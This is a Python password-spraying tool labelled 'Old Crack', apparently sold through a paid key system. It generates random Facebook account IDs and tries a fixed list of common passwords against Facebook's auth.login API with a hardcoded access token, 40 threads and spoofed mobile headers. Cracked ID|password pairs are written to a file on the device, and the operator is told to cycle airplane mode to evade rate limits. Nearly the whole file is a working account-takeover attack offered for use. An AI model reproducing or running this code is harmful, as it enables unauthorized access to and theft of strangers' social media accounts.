#Sc By Ghost
#Github: https://github.com/Ghost3987
#Tool Type : Old Crack 
#----------------------------[IMPORT/MODULE]-----------------------------------#
import requests,bs4,json,os,sys,uuid,random,datetime,time,re
import urllib3,rich,base64
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt
import os,time,random,json,sys,datetime
try:
    import requests
except:
    os.system("pip3 install requests")
    import requests 
from concurrent.futures import ThreadPoolExecutor as ThreadPool
#-----------------------------[LINE]-----------------------------------#
def lin():
	print("\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;31m")
#----------------------------[DATE]-----------------------------------#

#----------------------------[COLOR/CODE]-----------------------------------#
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'
#----------------------------[USER/AGENT]-----------------------------------#
def windows():
    aV=str(random.choice(range(10,20)))
    A=f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5,7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8,12)))}.0.{str(random.choice(range(552,661)))}.0 Safari/534.{aV}"
    bV=str(random.choice(range(1,36)))
    bx=str(random.choice(range(34,38)))
    bz=f"5{bx}.{bV}"
    B=f"Mozilla/5.0 (Windows NT {str(random.choice(range(5,7)))}.{str(random.choice(['2','1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{bz}"
    cV=str(random.choice(range(1,36)))
    cx=str(random.choice(range(34,38)))
    cz=f"5{cx}.{cV}"
    C=f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2','1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{cz}"
    D=f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1,7120)))}.0 Safari/537.36"
    return random.choice([A,B,C,D])
#----------------------------[LOGO]-----------------------------------#
logo = (f"""        
  ╔═╗╔═╗╔═╗  ╦  ╦╔═╗╔╗╔
╠═╣╠╣ ║ ╦  ║  ║║ ║║║║
╩ ╩╚  ╚═╝  ╩═╝╩╚═╝╝╚╝
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m DEVELOPER   :  AFG LION 
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m FACEBOOK    :  Hacking Helper
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m GITHUB      :  Afglion5
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m VERSION     :  0.1
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m TOOL        :  \033[1;34mOld Crack\033[1;32m
\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m FB GROUP    :  \033[1;91m\033[1;41m\033[1;33mTermux PAID Command World 2024\033[;0m\033[1;91m\033[1;92m\033[38;5;46m
\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;31m""")
#----------------------------[MAIN/DEF]-----------------------------------#
def main():
    user=[]
    os.system("clear")
    print(logo)
    print(f'\033[1;31m[\033[1;37m=\033[1;31m] \033[1;37mEXAMPLE    \033[1;33m : \033[1;37m5000/10000/99999')
    lin()
    limit=input(f"\033[1;31m[\033[1;37m?\033[1;31m]\033[1;37m INPUT \033[1;31m\033[1;37m: ")
    lin()
    os.system('clear')
    print(logo)
    print(f'\033[1;31m[\033[1;37m1\033[1;31m] \033[1;37m2010-2014 ')
    lin()
    ask=input(f"\033[1;31m[\033[1;37m?\033[1;31m] INPUT \033[1;37m:\033[1;33m ")
    lin()
    if ask in["1"]:
        newrin="10000"
        for i in range(int(limit)):
            data=str(random.choice(range(1000000000,1999999999)))
            user.append(data)
    with ThreadPool(max_workers=40) as Tx:
        os.system('clear')
        print(logo)
        print(f'\x1b[38;5;196m[\x1b[38;5;46m=\x1b[38;5;196m]\x1b[38;5;46m TOTAL ID : {limit} \x1b[38;5;196m')
        print(f'\x1b[38;5;196m[\x1b[38;5;46m+\x1b[38;5;196m]\x1b[38;5;46m TURN \x1b[38;5;196m[\x1b[38;5;46mON\x1b[38;5;196m/\x1b[38;5;46mOFF\x1b[38;5;196m]\x1b[38;5;46m AIRPLANE MODE EVERY 3 MIN')
        lin()
        for chin in user:
            uid=newrin+chin
            Tx.submit(login,uid)    
loop=0
oks=[]
def login(uid):
    global oks,loop
    Session=requests.session()
    try:
        sys.stdout.write(f'\r\x1b[38;5;196m[\x1b[38;5;48mAFG LION\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\033[1;37m{loop}\x1b[38;5;196m]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46mOK•{len(oks)}\x1b[38;5;196m]')
        sys.stdout.flush()
        for pw in ["123456","1234567","12345678","123456789","123123","143143"]:
            headers = {
    'authority': 'm.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=4aLRZuVyPtLywDF3JDXPjc8o; sb=4aLRZtoYBOxT2s0FcJl7pwjn; vpd=v1%3B708x375x2.8860480785369873; ps_l=1; ps_n=1; m_pixel_ratio=2.8860480785369873; locale=en_GB; wl_cbv=v2%3Bclient_version%3A2612%3Btimestamp%3A1725535552; wd=375x708; fr=0PfK8Q9mutH1vN7xP.AWXKxZlQHyJTF3oskIkbwAuQrc8.Bm0aLh..AAA.0.0.Bm2ZVV.AWXkS3z4tEI',
    'dpr': '2.625',
    'referer': 'https://m.facebook.com/bookmarks/',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"SM-N770F"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"13.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'service-worker-navigation-preload': '{"k":"rev,1016235849;locale,en_GB;cohort,BP:DEFAULT;branch,trunk;dpr,1;features,;u,100056877322310;","a":"1725535558","t":31536000,"n":"r7SDloO9","v":"2611","p":4,"r":1016235849,"o":"h2","y":"wblt"}',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'viewport-width': '980',
}
            rp=Session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers).json()
            if "session_key" in rp:
                print(f"\r\r\033[1;30m[\033[1;33mAFG LION\033[1;30m]\033[1;33m {uid} {A}•{G} {pw}")
                open("/sdcard/AFG LION-OLD-OK","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break 
            elif "www.facebook.com" in rp["error_msg"]:
                print(f"\r\r\033[1;30m[\033[1;33mAFG LION\033[1;30m]\033[1;33m {uid} {A}•{G} {pw}")
                open("/sdcard/AFG LION-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            else:continue
        loop+=1
    except:pass
    
    #__________________[ Approval.txt]__________________#
def linex():
        print('\033[1;37m----------------------------------------------')
        
def approval():
  uuid = str(os.geteuid())+"DS"+str(os.geteuid())
  id = "ARMAN•HACKING-"+"".join(uuid)
  os.system('clear')
  print(logo) 
  print("\033[1;37m [\u001b[36m•\033[1;37m]{7Days 4$}{15Days 6$}{30Days 8$}FoYou Need Approval To Use This Tool   \033[1;37m")
  print("\033[1;37m [\u001b[36m•\033[1;37m] Your Key :\u001b[36m "+id);time.sleep(0.1)
  print ("""\033[1;37m----------------------------------------------""")
  try:
    httpCaht = requests.get("https://github.com/Hacking6060/trick/blob/main/old.txt").text
    if id in httpCaht:
      print("\033[1;97m >> Your Key Has Been Approved !!!")
      msg = str(os.geteuid())
      time.sleep(1)
      pass
    else: 
      print("\x1b[1;97m >> Send Key on WhatsApp! ");
      time.sleep(0.1)
      
      input(' >> Click Enter To Send Your Key ')
      
      os.system('xdg-open https://wa.me/qr/SI5U6B3VRKSDL1')
      
      time.sleep(1)
      
      
      exit()
      
  except: 
  	
     print(" >> If you Don't pay Don't Come")
     
     time.sleep(2)
     
     exit()
approval()

#__________________[ END ]__________________#
main()
